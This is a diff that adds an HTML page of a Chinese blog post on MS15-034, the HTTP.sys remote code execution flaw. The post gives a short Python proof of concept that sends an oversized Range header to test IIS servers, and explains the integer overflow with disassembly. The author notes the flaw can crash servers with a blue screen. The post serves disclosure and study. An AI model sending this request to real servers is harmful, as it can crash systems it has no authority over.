@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="现在最多造成蓝屏 POC  import socket import random ipAddr &#x3D;&quot;WebSite&quot; hexAllFfff &#x3D;&quot;18446744073709551615&quot; count&#x3D;0 req1 &#x3D;&quot;GET&#x2F; HTTP&#x2F;1.0\r\n\r\n&quot; req &#x3D;&quot;GET&#x2F; HTTP&#x2F;1.1\r\nHost: stu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MS15-034 HTTP.sys 远程执行代码">
+<meta property="og:url" content="https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/index.html">
+<meta property="og:site_name" content="Y11en">
+<meta property="og:description" content="现在最多造成蓝屏 POC  import socket import random ipAddr &#x3D;&quot;WebSite&quot; hexAllFfff &#x3D;&quot;18446744073709551615&quot; count&#x3D;0 req1 &#x3D;&quot;GET&#x2F; HTTP&#x2F;1.0\r\n\r\n&quot; req &#x3D;&quot;GET&#x2F; HTTP&#x2F;1.1\r\nHost: stu">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2015-09-16T03:29:30.000Z">
+<meta property="article:modified_time" content="2018-03-31T15:35:05.151Z">
+<meta property="article:author" content="Y11en">
+<meta property="article:tag" content="POC">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>MS15-034 HTTP.sys 远程执行代码</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/10/03/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&text=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&is_video=false&description=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MS15-034 HTTP.sys 远程执行代码&body=Check out this article: https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&name=MS15-034 HTTP.sys 远程执行代码&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&t=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        MS15-034 HTTP.sys 远程执行代码
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Y11en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2015-09-16T03:29:30.000Z" itemprop="datePublished">2015-09-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/POC/" rel="tag">POC</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><strong>现在最多造成蓝屏</strong></p>
+<p><strong>POC</strong></p>
+<blockquote>
+<p>import socket</p>
+<p>import random</p>
+<p>ipAddr =&quot;WebSite&quot;</p>
+<p>hexAllFfff =&quot;18446744073709551615&quot;</p>
+<p>count=0</p>
+<p>req1 =&quot;GET/ HTTP/1.0\r\n\r\n&quot;</p>
+<p>req =&quot;GET/ HTTP/1.1\r\nHost: stuff\r\nRange: bytes=&quot;+str(count)+&quot;-&quot;+ hexAllFfff +&quot;\r\n\r\n&quot;</p>
+<p>print &quot;[*] Audit Started&quot;</p>
+<p>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
+<p>client_socket.connect((ipAddr, 80))</p>
+<p>client_socket.send(req1)</p>
+<p>boringResp = client_socket.recv(1024)</p>
+<p>if &quot;Microsoft&quot; not in boringResp:</p>
+<p>print &quot;[*] Not IIS&quot;</p>
+<p>exit(0)</p>
+<p>client_socket.close()</p>
+<p>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
+<p>client_socket.connect((ipAddr, 80))</p>
+<p>client_socket.send(req)</p>
+<p>goodResp = client_socket.recv(1024)</p>
+<p>if &quot;Requested Range Not Satisfiable&quot; in goodResp:</p>
+<p>print &quot;[!!] Looks VULN&quot;</p>
+<p>elif &quot; The request has an invalid header name&quot; in goodResp:</p>
+<p>print &quot;[*] Looks Patched&quot;</p>
+<p>else:</p>
+<p>print &quot;[*] Unexpected response, cannot discern patch status&quot;</p>
+<p>print goodResp </p>
+</blockquote>
+<p>**<br>**</p>
+<p><strong>漏洞原理：</strong></p>
+<p><strong>HTTP.sys 在处理内核缓存数据时，</strong></p>
+<p>**<br>**</p>
+<blockquote>
+<p>8a8b2112 56  push esi<br>8a8b2113 6a00  push 0<br>8a8b2115 2bc7  sub eax,edi<br>8a8b2117 6a01  push 1<br>8a8b2119 1bca  sbb ecx,edx<br>8a8b211b 51  push ecx<br>8a8b211c 50  push eax<br>8a8b211d e8bf69fbff call HTTP!RtlULongLongAdd (8a868ae1); here**<br>** </p>
+</blockquote>
+<p>**<br>**</p>
+<p><strong>eax1 = eax - edi</strong></p>
+<p><strong>ecx1 = ecx - edx</strong></p>
+<p><strong>RtlULongLongAdd (eax1, ecx1)</strong></p>
+<p>**<br>**</p>
+<p>其中 eax1 与 ecx1 是处理 HTTP 请求中</p>
+<blockquote>
+<p>Range: bytes=&quot;+<strong>offsetlow</strong>+&quot;-&quot;+<strong>offsethigh</strong>+&quot;\r\n\r\n&quot; </p>
+</blockquote>
+<p><strong>当offsetlow = 0 ,offsethigh= 0xFFFFFFFFFFFFFFFF</strong></p>
+<p><strong>时经过 RtlULongLongAdd 操作</strong></p>
+<p><strong>0xFFFFFFFFFFFFFFFF+ 0 + 1 = 0 造成整数溢出</strong></p>
+<p>&nbsp;</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&text=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&is_video=false&description=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MS15-034 HTTP.sys 远程执行代码&body=Check out this article: https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&title=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&name=MS15-034 HTTP.sys 远程执行代码&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y11en.github.io/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/&t=MS15-034 HTTP.sys 远程执行代码" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Y11en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
